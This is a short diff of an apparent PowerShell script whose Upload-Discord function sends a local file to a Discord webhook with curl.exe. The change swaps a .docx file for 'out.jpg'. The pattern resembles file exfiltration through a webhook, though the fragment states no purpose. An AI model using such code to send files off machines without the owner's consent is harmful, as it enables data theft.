@@ -21,4 +21,4 @@ Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -B
 if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
 }
 
-Upload-Discord -file "The harbor is filled with ships.docx" -text "this is an image"
+Upload-Discord -file "out.jpg" -text "this is an image"
